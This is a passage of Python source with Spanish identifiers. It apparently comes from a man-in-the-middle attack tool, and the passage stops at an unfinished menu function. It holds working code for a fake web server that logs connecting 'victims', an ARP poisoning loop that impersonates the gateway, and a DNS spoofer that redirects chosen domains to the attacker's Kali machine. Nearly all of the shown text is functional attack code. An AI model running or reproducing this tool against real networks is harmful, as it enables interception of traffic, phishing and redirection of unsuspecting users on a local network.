class ServidorFalso(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PAGINA_FALSA.encode())

    def log_message(self, format, *args):
        print(f"[HTTP] Victima conectada desde {self.client_address[0]}")


def iniciar_servidor_web(puerto):
    try:
        with socketserver.TCPServer(("", puerto), ServidorFalso) as httpd:
            print(f"[+] Servidor web falso activo en puerto {puerto}")
            httpd.serve_forever()
    except Exception as e:
        print(f"[!] Error servidor web: {e}")


def obtener_mac(ip, interfaz):
    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    respuestas, _ = srp(solicitud, iface=interfaz, timeout=3, verbose=False)
    if respuestas:
        return respuestas[0][1].hwsrc
    return None


def arp_poison(ip_victima, mac_victima, ip_gateway, mac_gateway, interfaz):
    print("[+] ARP Poisoning iniciado...")
    while True:
        send(ARP(op=2, pdst=ip_victima, hwdst=mac_victima, psrc=ip_gateway),
             iface=interfaz, verbose=False)
        send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victima),
             iface=interfaz, verbose=False)
        time.sleep(2)


def dns_spoof(pkt, ip_kali, dominios):
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
        return

    dominio = pkt[DNS].qd.qname.decode()

    if dominios and dominio not in dominios:
        return

    print(f"[*] DNS interceptado: {pkt[IP].src} → {dominio}")

    respuesta = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
        DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, rd=1, ra=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                type="A",
                ttl=10,
                rdata=ip_kali
            )
        )
    )

    send(respuesta, iface=pkt.sniffed_on, verbose=False)
    print(f"[!] Redirigido: {dominio} → {ip_kali}")


def menu():
